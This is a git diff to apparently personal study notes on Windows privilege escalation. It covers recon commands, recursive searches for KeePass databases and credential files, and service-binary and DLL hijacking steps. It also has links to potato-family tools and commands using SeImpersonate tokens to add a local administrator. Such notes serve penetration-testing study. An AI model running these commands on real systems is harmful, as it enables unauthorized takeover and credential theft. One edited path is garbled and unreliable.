@@ -65,7 +65,7 @@ User Account Control (UAC)
 
 ## Situational Awarness
 
-| ![Situational Awareness](/img/eop-situational-awareness.png) |
+| ![Situational Awareness](./img/eop-situational-awareness.png) |
 | :---: |
 | *Situational Awareness is the key for success* |
 
@@ -123,12 +123,15 @@ gci "%userprofile%\Downloads"
 # Running processes and path
 Get-Process
 Get-Process -FileVersionInfo
+# Find by TCP port
+Get-Process -Id (Get-NetTCPConnection -LocalPort 3306).OwningProcess
+# List process and users names
 Get-Process | % { $pi = Get-WmiObject Win32_Process -Filter "ProcessId = $($_.Id)"; $po = $pi.GetOwner(); echo $pi.Name $po.User}
 
 # Hidden password manager and configuration files (conditional)
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\Users\dave\ -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\-Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
 
 # Find Secretmanager like "Keypass"
 # https://www.windowspro.de/wolfgang-sommergut/powershell-secretmanagement-passwoerter-keepass-secretstore-verwalten
@@ -229,7 +232,6 @@ Set-DomainUserPassword -Identity andy -AccountPassword $userpass
 
 * Use `net groups` to add and delete users from Add group
 
-
 ## Hijacking Service Binaries
 
 * Find a service binary that can be manipulated by lower privileged users
@@ -248,6 +250,7 @@ wmic service get pathname,state | findstr /i "running"
 Get-Service -Name Apache2.4 -DependentServices -RequiredServices
 Get-ACL -Path "C:\xampp\apache\bin\httpd.exe" | Select -Expand Access
 # non-powershell
+sc.exe qc Apache2.4
 icacls "C:\xampp\apache\bin\httpd.exe"
 
 # https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
@@ -288,6 +291,8 @@ SeShutdownPrivilege           Shut down the system                 Disabled
 # Restart
 shutdown /r /t 0
 Restart-Service mysql
+# non-powershell
+sc.exe restart mysql
 
 # Verify attacks
 Get-LocalGroupMember administrators
@@ -379,6 +384,10 @@ DLL default loading path
 ```
 
 ```powershell
+[Environment]::SetEnvironmentVariable("Path", $Env:PATH + "C:\Users\Public;","User")
+```
+
+```powershell
 # List installed programs
 Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 # start procmon64.exe with admin permissions
@@ -445,15 +454,14 @@ Replace (Exlpoit)
 
 ## Exploit Privileges
 
-`SeImpersonatePrivilege`:
-
-`SeImpersonatePrivilege` might allow to leverage a token with another security context. A **user with this privilege can perform operations in the security context of another user account** under the specified circumstances. Other privileges that may lead to privilege escalation are `SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug`.
+`SeImpersonatePrivilege`: might allow to leverage a token with another security context. A **user with this privilege can perform operations in the security context of another user account** under the specified circumstances. Other privileges that may lead to privilege escalation are `SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug`.
 
 * Default Windows groups: Administrators, **LOCAL SERVICE, NETWORK SERVICE, and SERVICE** 
 * Detault IIS groups: **LocalService, LocalSystem, NetworkService, or ApplicationPoolIdentity**
 * Tools:
   * PrintSpoofer `https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe`
   * SigmaPotato `https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe`
+  * JuicyPotatoNG `https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip`
 
 ```powershell
 whoami /priv
@@ -469,6 +477,15 @@ nc.exe -l -p 1337
 # Add User
 SigmaPotato.exe "net user john password123! /add"
 SigmaPotato.exe "net localgroup Administrators john /add"
+
+whoami /priv
+..
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+
+# Use JuicyPotatoNG 
+# Source `https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip`
+./JuicyPotatoNG.exe -t u -p "C:\windows\system32\cmd.exe" -a "/c net user admin secret12345! /add"
+./JuicyPotatoNG.exe -t u -p "C:\windows\system32\cmd.exe" -a "/c net localgroup Administrators admin /add"
 ```
 
 ## Exploit Vulnerabilities
@@ -479,7 +496,7 @@ Find (Recon)
 # privileges, system info and security updates
 whoami /priv
 systeminfo
-Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
+
 ```
 
 Exploit Kernel
